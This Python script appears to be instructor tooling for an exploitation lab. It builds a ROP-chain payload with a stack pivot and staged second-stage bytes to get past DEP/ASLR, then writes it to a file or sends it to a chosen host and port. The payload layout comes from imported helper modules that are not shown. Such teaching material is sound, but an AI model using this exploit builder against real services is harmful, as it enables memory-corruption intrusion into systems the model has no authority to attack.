#!/usr/bin/env python3
"""Instructor-only request builder for DEP-2 and ASLR DEP-2 validation."""

from __future__ import annotations

import argparse
import socket
from pathlib import Path

from dep2_layout import build_staged_payload, build_status_proof
from exploit_scaffold import OP_ROP, build_request


def _dword(value: str) -> int:
    result = int(value, 0)
    if not 0 <= result <= 0xFFFFFFFF:
        raise argparse.ArgumentTypeError("value must fit in a DWORD")
    return result


def _hex_bytes(value: str) -> bytes:
    try:
        return bytes.fromhex(value)
    except ValueError as error:
        raise argparse.ArgumentTypeError("expected even-length hexadecimal bytes") from error


def build_packet(args: argparse.Namespace) -> bytes:
    proof = build_status_proof(args.status_address, args.success_value)
    payload = build_staged_payload(
        saved_eip_offset=args.saved_eip_offset,
        pop_eax_ret=args.pop_eax_ret,
        stage2_address=args.stage2_address,
        pivot=args.pivot,
        stage2_offset=args.stage2_offset,
        stage2=args.stage2,
        proof=proof,
    )
    return build_request(OP_ROP, payload)


def _common_arguments(parser: argparse.ArgumentParser) -> None:
    parser.add_argument("--saved-eip-offset", type=int, required=True)
    parser.add_argument("--pop-eax-ret", type=_dword, required=True)
    parser.add_argument("--stage2-address", type=_dword, required=True)
    parser.add_argument("--pivot", type=_dword, required=True)
    parser.add_argument("--stage2-offset", type=int, required=True)
    parser.add_argument("--stage2-hex", dest="stage2", type=_hex_bytes, required=True)
    parser.add_argument("--status-address", type=_dword, required=True)
    parser.add_argument("--success-value", type=_dword, default=0x1337C0DE)


def parse_args() -> argparse.Namespace:
    parser = argparse.ArgumentParser(description=__doc__)
    subparsers = parser.add_subparsers(dest="command", required=True)
    build = subparsers.add_parser("build", help="write a framed instructor request")
    _common_arguments(build)
    build.add_argument("--output", type=Path, required=True)
    send = subparsers.add_parser("send", help="send a framed instructor request")
    _common_arguments(send)
    send.add_argument("--host", required=True)
    send.add_argument("--port", type=int, required=True)
    return parser.parse_args()


def main() -> int:
    args = parse_args()
    packet = build_packet(args)
    if args.command == "build":
        args.output.write_bytes(packet)
        print(f"wrote {len(packet)} bytes to {args.output}")
        return 0

    with socket.create_connection((args.host, args.port), timeout=5) as connection:
        connection.sendall(packet)
    print(f"sent {len(packet)} bytes to {args.host}:{args.port}")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
